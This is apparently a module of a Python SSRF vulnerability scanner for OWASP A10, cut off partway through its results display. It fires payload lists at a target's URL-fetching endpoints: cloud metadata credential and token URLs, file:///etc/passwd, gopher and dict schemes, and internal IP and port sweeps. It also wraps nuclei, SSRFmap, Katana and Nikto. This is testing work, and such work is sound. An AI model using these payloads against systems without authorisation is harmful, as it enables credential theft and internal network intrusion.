# -*- coding: utf-8 -*-
import os
import sys
import subprocess
import requests
import json
import re
from urllib.parse import urlparse
from datetime import datetime
from utils import normalize_url, is_noise_line
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn

# Add path to core modules for absolute imports
import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..', '..'))


# ================== CONFIG ==================
OUTPUT_DIR = "reports/a10_ssrf_results"
SSRFMAP_IMAGE = "ssrfmap:latest"
KATANA_IMAGE = "projectdiscovery/katana:latest"
console = Console()

# Tạo thư mục output ngay từ đầu
try:
    os.makedirs(OUTPUT_DIR, exist_ok=True)
except Exception as e:
    console.print(f"[red]Error creating output directory: {e}[/red]")
    sys.exit(1)

# ===================== CVSS SEVERITY STANDARD =====================
CVSS_METRICS = {
    "Attack Vector": {"Network": 0.85, "Adjacent": 0.62, "Local": 0.55, "Physical": 0.2},
    "Attack Complexity": {"Low": 0.77, "High": 0.44},
    "Privileges Required": {"None": 0.85, "Low": 0.62, "High": 0.27},
    "User Interaction": {"None": 0.85, "Required": 0.62},
    "Scope": {"Unchanged": 6.42, "Changed": 7.52},
    "Confidentiality": {"None": 0, "Low": 0.22, "High": 0.56},
    "Integrity": {"None": 0, "Low": 0.22, "High": 0.56},
    "Availability": {"None": 0, "Low": 0.22, "High": 0.56}
}

# A10 Vulnerability Mappings với CVSS
A10_VULNERABILITY_MAPPINGS = {
    "SSRF_INTERNAL_NETWORK": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "severity": "CRITICAL", "score": 9.8,
        "description": "SSRF allows access to internal network resources"
    },
    "SSRF_CLOUD_METADATA": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "severity": "CRITICAL", "score": 9.8,
        "description": "SSRF exposes cloud metadata and credentials"
    },
    "SSRF_SERVICE_DISCOVERY": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
        "severity": "HIGH", "score": 7.5,
        "description": "SSRF enables internal service discovery"
    },
    "SSRF_PORT_SCANNING": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "severity": "MEDIUM", "score": 6.5,
        "description": "SSRF allows internal port scanning"
    },
    "SSRF_PROTOCOL_TESTING": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        "severity": "MEDIUM", "score": 6.5,
        "description": "SSRF enables testing of internal protocols"
    },
    "SSRF_INFORMATION_DISCLOSURE": {
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
        "severity": "MEDIUM", "score": 5.3,
        "description": "SSRF reveals internal system information"
    }
}

# OWASP A10:2021 - Server-Side Request Forgery Classification
SEVERITY_LEVELS = {
    "CRITICAL": {"color": "red", "score": "9.0-10.0", "description": "Critical SSRF - immediate remediation required",
                 "keywords": ["ssrf", "internal network", "cloud metadata", "critical", "breach", "unauthorized", "malicious", "compromise", "backdoor", "rootkit", "malware"]},
    "HIGH": {"color": "bright_red", "score": "7.0-8.9", "description": "High severity SSRF vulnerabilities",
             "keywords": ["service discovery", "internal access", "unauthorized", "access", "sensitive", "data", "exposure", "leak"]},
    "MEDIUM": {"color": "yellow", "score": "4.0-6.9", "description": "Medium severity - SSRF improvements needed",
               "keywords": ["medium", "warning", "notice", "info", "misconfiguration", "port scanning", "protocol testing"]},
    "LOW": {"color": "blue", "score": "0.1-3.9", "description": "Informational or low impact findings",
            "keywords": ["low", "info", "note", "debug", "development", "test", "sample", "non-critical", "minor", "cosmetic", "display issue", "enumeration"]}
}

# ================== UTIL ==================
def sanitize_filename(url):
    return urlparse(url).netloc.replace(":", "_")

def save_output(filename, data, append=False):
    try:
        os.makedirs(OUTPUT_DIR, exist_ok=True)
    except Exception as e:
        console.print(f"[red]Error creating output directory: {e}[/red]")
        return
    
    mode = "a" if append else "w"
    try:
        with open(os.path.join(OUTPUT_DIR, filename), mode, encoding="utf-8") as f:
            f.write(data)
    except Exception as e:
        console.print(f"[red]Error saving {filename}: {e}[/red]")

def limit_findings(findings, max_findings=50):
    """Limit the number of findings to avoid spam"""
    if len(findings) > max_findings:
        limited = findings[:max_findings]
        limited.append(f"[INFO] ... and {len(findings) - max_findings} more findings (truncated for readability)")
        return limited
    return findings

# normalize_url is now provided by utils.normalize_url

def run_command(cmd_list):
    try:
        try:
            from core.security_utils import SecurityUtils
            cmd_str = " ".join(cmd_list)
            result = SecurityUtils.safe_subprocess_run(cmd_str, timeout=120)
            if result is None:
                console.print(f"[red]ERROR: Command blocked for security: {cmd_str}[/red]")
                return "Command blocked for security reasons"
        except ImportError:
            # Fallback to direct subprocess with timeout
            result = subprocess.run(cmd_list, capture_output=True, text=True, timeout=300)
        return result.stdout + "\n" + result.stderr
    except Exception as e:
        return f"Command error: {str(e)}\n"

def check_tool_available(tool_name):
    try:
        try:
            from core.security_utils import SecurityUtils
            cmd_str = " ".join([tool_name, "--version"])
            result = SecurityUtils.safe_subprocess_run(cmd_str, timeout=120)
            if result is None:
                console.print(f"[red]ERROR: Command blocked for security: {cmd_str}[/red]")
                return False
        except ImportError:
            # Fallback to direct subprocess with timeout
            result = subprocess.run([tool_name, "--version"], capture_output=True, text=True, timeout=300)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def calculate_cvss_score(vulnerability_type):
    """Tính CVSS score dựa trên loại vulnerability"""
    if vulnerability_type in A10_VULNERABILITY_MAPPINGS:
        return A10_VULNERABILITY_MAPPINGS[vulnerability_type]["score"]
    return 5.0  # Default MEDIUM

def classify_severity_advanced(finding, vulnerability_type=None):
    """Phân loại severity theo tiêu chuẩn CVSS"""
    f_lower = finding.lower()
    
    # Nếu có vulnerability_type, sử dụng mapping
    if vulnerability_type and vulnerability_type in A10_VULNERABILITY_MAPPINGS:
        mapping = A10_VULNERABILITY_MAPPINGS[vulnerability_type]
        score = mapping["score"]
        severity = mapping["severity"]
        color = SEVERITY_LEVELS[severity]["color"]
        return severity, color, score, mapping["cvss_vector"]
    
    # Fallback: phân tích theo keywords
    for level in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        for kw in SEVERITY_LEVELS[level]["keywords"]:
            if kw.lower() in f_lower:
                if level == "CRITICAL":
                    score = 9.8
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                elif level == "HIGH":
                    score = 7.5
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"
                elif level == "MEDIUM":
                    score = 5.3
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"
                else:
                    score = 3.1
                    return level, SEVERITY_LEVELS[level]["color"], score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
    
    score = 3.1
    return "LOW", "blue", score, "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"

# ================== A10 ADVANCED FEATURES ==================

# 1. SSRF DETECTION
def detect_ssrf_vulnerabilities(target):
    """Detect SSRF vulnerabilities"""
    console.print("[cyan][*] Running SSRF Detection...[/cyan]")
    findings = []
    
    # Advanced SSRF payloads for testing
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://169.254.169.254/metadata/instance",  # Azure metadata
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        "http://127.0.0.1/",  # Localhost
        "http://localhost/",  # Localhost
        "http://10.0.0.1/",  # Internal network
        "http://172.17.0.1/",  # Docker internal
        "http://192.168.1.1/",  # Internal network
        "http://0.0.0.0/",  # All interfaces
        "http://[::1]/",  # IPv6 localhost
        "file:///etc/passwd",  # File protocol
        "dict://127.0.0.1:11211/",  # Memcached
        "ftp://127.0.0.1/",  # FTP
        "gopher://127.0.0.1/_",  # Gopher
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",  # AWS credentials
        "http://169.254.169.254/metadata/identity/oauth2/token",  # Azure token
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",  # GCP service accounts
    ]
    
    # Test endpoints for SSRF
    test_endpoints = [
        "/url", "/link", "/redirect", "/fetch", "/proxy",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy",
        "/webhook", "/callback", "/ping", "/health", "/status",
        "/api/webhook", "/api/callback", "/api/ping", "/api/health", "/api/status"
    ]
    
    for endpoint in test_endpoints:
        try:
            # Ensure target has proper protocol
            if not target.startswith(('http://', 'https://')):
                target_url = f"http://{target}"
            else:
                target_url = target
            
            url = target_url.rstrip("/") + endpoint
            for payload in ssrf_payloads:
                try:
                    # Test GET request
                    r = requests.get(url, params={"url": payload}, timeout=5)
                    if r.status_code == 200:
                        findings.append(f"[SSRF_INTERNAL_NETWORK] Potential SSRF via GET {endpoint} with payload: {payload}")
                    
                    # Test POST request
                    r = requests.post(url, data={"url": payload}, timeout=5)
                    if r.status_code == 200:
                        findings.append(f"[SSRF_INTERNAL_NETWORK] Potential SSRF via POST {endpoint} with payload: {payload}")
                        
                except Exception as e:
                    # Skip logging too many errors to avoid spam
                    if "Invalid URL" not in str(e) and "Connection" not in str(e):
                        findings.append(f"[ERROR] Error testing SSRF on {endpoint}: {e}")
        except Exception as e:
            findings.append(f"[ERROR] Error setting up endpoint {endpoint}: {e}")
    
    limited_findings = limit_findings(findings)
    save_output("ssrf_detection.txt", "\n".join(limited_findings))
    return limited_findings

# 2. CLOUD METADATA TESTING
def test_cloud_metadata_endpoints(target):
    """Test cloud metadata endpoints"""
    console.print("[cyan][*] Running Cloud Metadata Testing...[/cyan]")
    findings = []
    
    # Cloud metadata endpoints
    cloud_endpoints = {
        "AWS": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/public-ipv4",
            "http://169.254.169.254/latest/meta-data/local-ipv4",
            "http://169.254.169.254/latest/meta-data/security-groups",
            "http://169.254.169.254/latest/meta-data/placement/availability-zone"
        ],
        "Azure": [
            "http://169.254.169.254/metadata/instance",
            "http://169.254.169.254/metadata/identity/oauth2/token",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
            "http://169.254.169.254/metadata/instance?api-version=2019-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        ],
        "GCP": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/",
            "http://metadata.google.internal/computeMetadata/v1/project/project-id"
        ],
        "DigitalOcean": [
            "http://169.254.169.254/metadata/v1/",
            "http://169.254.169.254/metadata/v1/id",
            "http://169.254.169.254/metadata/v1/region",
            "http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address"
        ]
    }
    
    # Test SSRF endpoints for cloud metadata
    ssrf_endpoints = [
        "/url", "/link", "/redirect", "/fetch", "/proxy",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy"
    ]
    
    for cloud_provider, endpoints in cloud_endpoints.items():
        for metadata_url in endpoints:
            for ssrf_endpoint in ssrf_endpoints:
                url = target.rstrip("/") + ssrf_endpoint
                try:
                    r = requests.get(url, params={"url": metadata_url}, timeout=5)
                    if r.status_code == 200:
                        findings.append(f"[SSRF_CLOUD_METADATA] Potential {cloud_provider} metadata access via {ssrf_endpoint}: {metadata_url}")
                except Exception as e:
                    findings.append(f"[ERROR] Error testing {cloud_provider} metadata: {e}")
    
    limited_findings = limit_findings(findings)
    save_output("cloud_metadata_testing.txt", "\n".join(limited_findings))
    return limited_findings

# 3. INTERNAL NETWORK SCANNING
def scan_internal_network(target):
    """Scan internal network via potential SSRF"""
    console.print("[cyan][*] Running Internal Network Scanning...[/cyan]")
    findings = []
    
    # Internal network ranges
    internal_ranges = [
        "127.0.0.1", "localhost", "0.0.0.0",
        "10.0.0.1", "10.0.0.2", "10.0.0.10", "10.0.0.100",
        "172.16.0.1", "172.17.0.1", "172.18.0.1", "172.19.0.1",
        "192.168.0.1", "192.168.1.1", "192.168.10.1", "192.168.100.1",
        "169.254.169.254",  # Cloud metadata
        "169.254.170.2",    # AWS VPC DNS
        "8.8.8.8", "8.8.4.4"  # Google DNS
    ]
    
    # Common internal services
    internal_services = [
        "/", "/admin", "/login", "/api", "/health", "/status",
        "/metrics", "/debug", "/info", "/actuator", "/management"
    ]
    
    # Test SSRF endpoints
    ssrf_endpoints = [
        "/url", "/link", "/redirect", "/fetch", "/proxy",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy"
    ]
    
    for internal_ip in internal_ranges:
        for service in internal_services:
            internal_url = f"http://{internal_ip}{service}"
            for ssrf_endpoint in ssrf_endpoints:
                url = target.rstrip("/") + ssrf_endpoint
                try:
                    r = requests.get(url, params={"url": internal_url}, timeout=5)
                    if r.status_code == 200:
                        findings.append(f"[SSRF_SERVICE_DISCOVERY] Internal service accessible via {ssrf_endpoint}: {internal_url}")
                except Exception as e:
                    findings.append(f"[ERROR] Error testing internal network: {e}")
    
    limited_findings = limit_findings(findings)
    save_output("internal_network_scanning.txt", "\n".join(limited_findings))
    return limited_findings

# 4. PORT SCANNING VIA SSRF
def scan_internal_ports(target):
    """Scan internal ports via potential SSRF"""
    console.print("[cyan][*] Running Internal Port Scanning...[/cyan]")
    findings = []
    
    # Common internal ports
    common_ports = [
        22, 23, 25, 53, 80, 110, 143, 443, 993, 995,  # Common services
        21, 69, 123, 161, 389, 636, 1433, 1521, 3306, 5432,  # Database ports
        27017, 6379, 11211, 8080, 8443, 9000, 9200, 9300  # Application ports
    ]
    
    # Internal IPs to test
    internal_ips = ["127.0.0.1", "localhost", "10.0.0.1", "172.17.0.1", "192.168.1.1"]
    
    # Test SSRF endpoints
    ssrf_endpoints = [
        "/url", "/link", "/redirect", "/fetch", "/proxy",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy"
    ]
    
    for internal_ip in internal_ips:
        for port in common_ports:
            port_url = f"http://{internal_ip}:{port}/"
            for ssrf_endpoint in ssrf_endpoints:
                url = target.rstrip("/") + ssrf_endpoint
                try:
                    r = requests.get(url, params={"url": port_url}, timeout=3)
                    if r.status_code == 200:
                        findings.append(f"[SSRF_PORT_SCANNING] Port {port} accessible via {ssrf_endpoint} on {internal_ip}")
                except Exception as e:
                    findings.append(f"[ERROR] Error testing port {port}: {e}")
    
    limited_findings = limit_findings(findings)
    save_output("internal_port_scanning.txt", "\n".join(limited_findings))
    return limited_findings

# 5. PROTOCOL TESTING
def test_internal_protocols(target):
    """Test internal protocols via potential SSRF"""
    console.print("[cyan][*] Running Internal Protocol Testing...[/cyan]")
    findings = []
    
    # Different protocols to test
    protocols = [
        "http://127.0.0.1/",
        "https://127.0.0.1/",
        "ftp://127.0.0.1/",
        "dict://127.0.0.1:11211/",
        "gopher://127.0.0.1/_",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/version",
        "file:///sys/class/net/",
        "tftp://127.0.0.1/",
        "ldap://127.0.0.1/",
        "ldaps://127.0.0.1/"
    ]
    
    # Test SSRF endpoints
    ssrf_endpoints = [
        "/url", "/link", "/redirect", "/fetch", "/proxy",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy"
    ]
    
    for protocol_url in protocols:
        for ssrf_endpoint in ssrf_endpoints:
            try:
                # Ensure target has proper protocol
                if not target.startswith(('http://', 'https://')):
                    target_url = f"http://{target}"
                else:
                    target_url = target
                
                url = target_url.rstrip("/") + ssrf_endpoint
                r = requests.get(url, params={"url": protocol_url}, timeout=5)
                if r.status_code == 200:
                    findings.append(f"[SSRF_PROTOCOL_TESTING] Protocol accessible via {ssrf_endpoint}: {protocol_url}")
            except Exception as e:
                # Skip logging too many errors to avoid spam
                if "Invalid URL" not in str(e):
                    findings.append(f"[ERROR] Error testing protocol {protocol_url}: {e}")
    
    limited_findings = limit_findings(findings)
    save_output("internal_protocol_testing.txt", "\n".join(limited_findings))
    return limited_findings

# 6. INFORMATION DISCLOSURE VIA SSRF
def detect_information_disclosure(target):
    """Detect information disclosure via SSRF"""
    console.print("[cyan][*] Running Information Disclosure Detection...[/cyan]")
    findings = []
    
    # Information disclosure endpoints
    info_endpoints = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:3000/",
        "http://127.0.0.1:5000/",
        "http://127.0.0.1:8000/",
        "http://127.0.0.1:9000/",
        "http://127.0.0.1/admin",
        "http://127.0.0.1/phpinfo.php",
        "http://127.0.0.1/info.php",
        "http://127.0.0.1/status",
        "http://127.0.0.1/health",
        "http://127.0.0.1/metrics",
        "http://127.0.0.1/debug",
        "http://127.0.0.1/actuator",
        "http://127.0.0.1/management"
    ]
    
    # Test SSRF endpoints
    ssrf_endpoints = [
        "/url", "/link", "/redirect", "/fetch", "/proxy",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy"
    ]
    
    for info_url in info_endpoints:
        for ssrf_endpoint in ssrf_endpoints:
            url = target.rstrip("/") + ssrf_endpoint
            try:
                r = requests.get(url, params={"url": info_url}, timeout=5)
                if r.status_code == 200:
                    findings.append(f"[SSRF_INFORMATION_DISCLOSURE] Information accessible via {ssrf_endpoint}: {info_url}")
            except Exception as e:
                findings.append(f"[ERROR] Error testing information disclosure: {e}")
    
    limited_findings = limit_findings(findings)
    save_output("information_disclosure_detection.txt", "\n".join(limited_findings))
    return limited_findings

# ================== A10 BASIC SCAN ==================
def check_ssrf_headers(target):
    """Check SSRF-related HTTP headers"""
    console.print("[cyan][*] Checking SSRF-related HTTP Headers...[/cyan]")
    findings = []
    
    try:
        r = requests.get(target, timeout=10)
        headers = r.headers
        
        # Check for headers that might indicate SSRF
        ssrf_indicators = ["x-forwarded-for", "x-real-ip", "x-forwarded-host", "x-forwarded-proto"]
        
        for header in headers:
            if any(indicator in header.lower() for indicator in ssrf_indicators):
                findings.append(f"[SSRF_HEADER] SSRF-related header found: {header}: {headers[header]}")
        
        if not any(ind in h.lower() for h in headers for ind in ssrf_indicators):
            findings.append("[SSRF_HEADER] No obvious SSRF-related headers found")
            
    except Exception as e:
        findings.append(f"[ERROR] Header check failed: {e}")
    
    save_output("ssrf_headers_check.txt", "\n".join(findings))
    return findings

def find_ssrf_endpoints(target):
    """Find potential SSRF endpoints"""
    console.print("[cyan][*] Scanning for potential SSRF endpoints...[/cyan]")
    findings = []
    
    # Common SSRF endpoints
    ssrf_paths = [
        "/url", "/link", "/redirect", "/fetch", "/proxy", "/webhook",
        "/api/url", "/api/link", "/api/redirect", "/api/fetch", "/api/proxy", "/api/webhook",
        "/callback", "/ping", "/health", "/status", "/check",
        "/api/callback", "/api/ping", "/api/health", "/api/status", "/api/check",
        "/image", "/img", "/picture", "/photo", "/avatar",
        "/api/image", "/api/img", "/api/picture", "/api/photo", "/api/avatar"
    ]
    
    for path in ssrf_paths:
        url = target.rstrip("/") + path
        try:
            r = requests.get(url, timeout=5)
            if r.status_code in [200, 403, 401]:
                findings.append(f"[SSRF_ENDPOINT] Potential SSRF endpoint accessible: {path}")
        except Exception as e:
            findings.append(f"[ERROR] Error checking {path}: {e}")
    
    save_output("ssrf_endpoints.txt", "\n".join(findings))
    return findings

def run_nuclei_ssrf_templates(target):
    """Run Nuclei SSRF-related templates"""
    console.print("[cyan][*] Running Nuclei SSRF templates...[/cyan]")
    output = ""
    
    if not check_tool_available("nuclei"):
        output += "[!] Nuclei not found. Skipping Nuclei scans.\n"
        return output
    
    try:
        # Enhanced Nuclei command with better SSRF coverage
        cmd = [
            "nuclei", "-u", target,
            "-etags", "dos",  # exclude DoS templates
            "-tags", "ssrf,redirect,proxy,url-fetch,webhook",
            "-severity", "critical,high,medium",
            "-silent",
            "-o", os.path.join(OUTPUT_DIR, "nuclei_ssrf_templates.txt")
        ]
        result = run_command(cmd)
        if result.strip():
            output += result
            console.print("[green][✓] Nuclei SSRF templates scan completed.[/green]")
        else:
            output += "[NUCLEI] No SSRF vulnerabilities found by Nuclei\n"
            console.print("[yellow][!] No SSRF findings from Nuclei[/yellow]")
    except Exception as e:
        output += f"[!] Error running Nuclei: {str(e)}\n"
        console.print(f"[red][!] Nuclei failed: {e}[/red]")
    
    save_output("nuclei_ssrf_templates.txt", output)
    return output

def run_ssrfmap_scan(target):
    """Run SSRFmap from Docker for comprehensive SSRF testing"""
    console.print("[cyan][*] Running SSRFmap from Docker...[/cyan]")
    output = ""
    
    try:
        # SSRFmap expects the vulnerable URL with parameter placeholder
        # Example: http://target.com/url?u=PAYLOAD
        ssrfmap_url = f"{target}/url?u=PAYLOAD"
        
        cmd = [
            "docker", "run", "--rm",
            SSRFMAP_IMAGE,
            "python3", "ssrfmap.py",
            "-u", ssrfmap_url,
            "-m", "cloud",
            "--level", "3"
        ]
        result = run_command(cmd)
        if result.strip():
            output += result
            output += "\n[SSRFMAP] SSRFmap scan completed with cloud metadata testing\n"
        else:
            output += "[SSRFMAP] No SSRF vulnerabilities found by SSRFmap\n"
            
    except Exception as e:
        output += f"[!] Error running SSRFmap: {str(e)}\n"
        output += "[!] Make sure Docker is running and SSRFmap image is available\n"
    
    save_output("ssrfmap_scan.txt", output)
    return output

def run_katana_scan(target):
    """Run Katana for endpoint discovery"""
    console.print("[cyan][*] Running Katana for endpoint discovery...[/cyan]")
    output = ""
    
    try:
        cmd = [
            "docker", "run", "--rm",
            KATANA_IMAGE,
            "-u", target,
            "-jc",  # JSON output
            "-silent"
        ]
        result = run_command(cmd)
        if result.strip():
            output += result
            output += "\n[KATANA] Endpoint discovery completed\n"
        else:
            output += "[KATANA] No endpoints found\n"
            
    except Exception as e:
        output += f"[!] Error running Katana: {str(e)}\n"
        output += "[!] Make sure Docker is running and Katana image is available\n"
    
    save_output("katana_endpoints.txt", output)
    return output

def run_nikto_scan(target):
    """Run Nikto for web server vulnerabilities"""
    console.print("[cyan][*] Running Nikto scan...[/cyan]")
    output = ""
    
    if not check_tool_available("nikto"):
        output += "[!] Nikto not found. Skipping Nikto scans.\n"
        return output
    
    try:
        # Enhanced Nikto command with better output handling
        cmd = [
            "nikto", "-h", target,
            "-Format", "txt",
            "-output", os.path.join(OUTPUT_DIR, "nikto_output.txt")
        ]
        result = run_command(cmd)
        if result.strip():
            output += result
            console.print("[green][✓] Nikto scan completed.[/green]")
        else:
            output += "[NIKTO] No vulnerabilities found by Nikto\n"
            console.print("[yellow][!] No findings from Nikto[/yellow]")
    except Exception as e:
        output += f"[!] Error running Nikto: {str(e)}\n"
        console.print(f"[red][!] Nikto failed: {e}[/red]")
    
    save_output("nikto_output.txt", output)
    return output

def run_custom_debug_tests(target):
    """Perform custom debug/error header check for SSRF indicators"""
    console.print("[cyan][*] Performing custom debug/error header check...[/cyan]")
    output = ""
    
    try:
        # Ensure URL is normalized even if called independently
        safe_target = normalize_url(target)
        response = requests.get(safe_target, timeout=10)
        debug_indicators = [
            "x-debug", "x-powered-by", "server", "x-runtime", "trace", 
            "x-aspnet-version", "x-forwarded-for", "x-real-ip", "x-forwarded-host",
            "x-forwarded-proto", "x-original-url", "x-rewrite-url"
        ]
        
        output += "\n# Custom Header Checks for SSRF Indicators:\n"
        found_indicators = []
        
        for header, value in response.headers.items():
            if any(indicator in header.lower() for indicator in debug_indicators):
                output += f"{header}: {value}\n"
                found_indicators.append(f"{header}: {value}")
        
        if found_indicators:
            output += f"\n[SSRF_HEADER] Found {len(found_indicators)} SSRF-related headers\n"
            console.print(f"[green][✓] Found {len(found_indicators)} SSRF-related headers[/green]")
        else:
            output += "\n[SSRF_HEADER] No obvious SSRF-related headers found\n"
            console.print("[yellow][!] No SSRF-related headers found[/yellow]")
            
    except Exception as e:
        output += f"[ERROR] Request failed: {e}\n"
        console.print(f"[red][!] Custom header check failed: {e}[/red]")
    
    save_output("custom_debug_tests.txt", output)
    return output

# ================== ANALYSIS ==================
def analyze_results():
    console.print("[magenta][*] Analyzing A10 scan results...[/magenta]")

    categorized = {sev: [] for sev in SEVERITY_LEVELS}
    findings = []
    cvss_scores = []
    vulnerability_details = []

    # Collect all findings with proper classification
    finding_files = [
        ("ssrf_detection.txt", "SSRF_INTERNAL_NETWORK"),
        ("cloud_metadata_testing.txt", "SSRF_CLOUD_METADATA"),
        ("internal_network_scanning.txt", "SSRF_SERVICE_DISCOVERY"),
        ("internal_port_scanning.txt", "SSRF_PORT_SCANNING"),
        ("internal_protocol_testing.txt", "SSRF_PROTOCOL_TESTING"),
        ("information_disclosure_detection.txt", "SSRF_INFORMATION_DISCLOSURE"),
        ("ssrf_headers_check.txt", None),
        ("ssrf_endpoints.txt", None),
        ("nuclei_ssrf_templates.txt", None),
        ("ssrfmap_scan.txt", "SSRF_CLOUD_METADATA"),
        ("katana_endpoints.txt", None),
        ("nikto_output.txt", None),
        ("custom_debug_tests.txt", None)
    ]

    for file, vuln_type in finding_files:
        file_path = os.path.join(OUTPUT_DIR, file)
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    for line in f:
                        if line.strip() and not is_noise_line(line):
                            severity, color, score, cvss_vector = classify_severity_advanced(line, vuln_type)
                            categorized[severity].append({"source": file, "finding": line.strip()})
                            findings.append(line.strip())
                            cvss_scores.append(score)
                            
                            # Store vulnerability details
                            if vuln_type and vuln_type in A10_VULNERABILITY_MAPPINGS:
                                mapping = A10_VULNERABILITY_MAPPINGS[vuln_type]
                                vulnerability_details.append({
                                    "type": vuln_type,
                                    "finding": line.strip(),
                                    "cvss_score": score,
                                    "cvss_vector": cvss_vector,
                                    "severity": severity,
                                    "description": mapping["description"]
                                })
            except Exception as e:
                console.print(f"[red]Error reading {file}: {e}[/red]")

    display_results(categorized, cvss_scores)
    save_summary(findings, categorized, vulnerability_details, cvss_scores)

def display_results(categorized, cvss_scores):
    # Always show CVSS tables regardless of findings
    console.print("\n" + "="*80)
    console.print("[bold cyan]🔍 CVSS 3.1 METRICS REFERENCE[/bold cyan]")
    console.print("="*80)
    
    # CVSS Metrics Table
    cvss_table = Table(title="🔍 CVSS 3.1 Metrics Reference", header_style="bold cyan", border_style="cyan")
    cvss_table.add_column("Metric", style="yellow", width=20)
    cvss_table.add_column("Value", style="green", width=15)
    cvss_table.add_column("Score", style="blue", justify="center", width=10)
    cvss_table.add_column("Description", style="white", width=30)
    
    cvss_table.add_row("Attack Vector", "Network", "0.85", "Remote exploitation")
    cvss_table.add_row("Attack Complexity", "Low", "0.77", "No special conditions")
    cvss_table.add_row("Privileges Required", "None", "0.85", "No authentication")
    cvss_table.add_row("User Interaction", "None", "0.85", "No user interaction")
    cvss_table.add_row("Scope", "Unchanged", "6.42", "Same security scope")
    cvss_table.add_row("Confidentiality", "High", "0.56", "Complete data loss")
    cvss_table.add_row("Integrity", "High", "0.56", "Complete data modification")
    cvss_table.add_row("Availability", "High", "0.56", "Complete system loss")
    
    console.print(cvss_table)
    console.print()

    # Main Results Table
    console.print("\n" + "="*80)
    console.print("[bold magenta]📊 A10 SERVER-SIDE REQUEST FORGERY - CVSS STANDARD OVERVIEW[/bold magenta]")
    console.print("="*80)
    
    table = Table(title="📊 A10 Server-Side Request Forgery - CVSS Standard Overview", header_style="bold magenta", border_style="magenta")
    table.add_column("Severity", style="cyan", width=12)
    table.add_column("CVSS Score", style="green", justify="center", width=12)
    table.add_column("CVSS Vector", style="blue", width=35)
    table.add_column("Count", style="green", justify="center", width=8)
    table.add_column("Description", style="white", width=25)
    table.add_column("A10 Coverage", style="yellow", width=30)

    coverage_info = {
        "CRITICAL": "Internal Network Access, Cloud Metadata",
        "HIGH": "Service Discovery, Internal Access",
        "MEDIUM": "Port Scanning, Protocol Testing", 
        "LOW": "Info Disclosure, Reconnaissance"
    }

    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        count = len(categorized[sev])
        avg_score = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0
        table.add_row(
            f"[{SEVERITY_LEVELS[sev]['color']}]{sev}[/{SEVERITY_LEVELS[sev]['color']}]",
            f"{avg_score:.1f}" if avg_score > 0 else "N/A",
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" if sev == "CRITICAL" else "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            str(count),
            SEVERITY_LEVELS[sev]["description"],
            coverage_info[sev]
        )
    console.print(table)

    # Vulnerability Types Table
    console.print("\n" + "="*80)
    console.print("[bold red]🎯 A10 SSRF VULNERABILITY TYPES[/bold red]")
    console.print("="*80)
    
    vuln_table = Table(title="🎯 A10 SSRF Vulnerability Types", header_style="bold red", border_style="red")
    vuln_table.add_column("Type", style="cyan", width=25)
    vuln_table.add_column("CVSS Score", style="green", justify="center", width=12)
    vuln_table.add_column("CVSS Vector", style="blue", width=35)
    vuln_table.add_column("Description", style="white", width=40)
    
    for vuln_type, mapping in A10_VULNERABILITY_MAPPINGS.items():
        vuln_table.add_row(
            vuln_type,
            str(mapping["score"]),
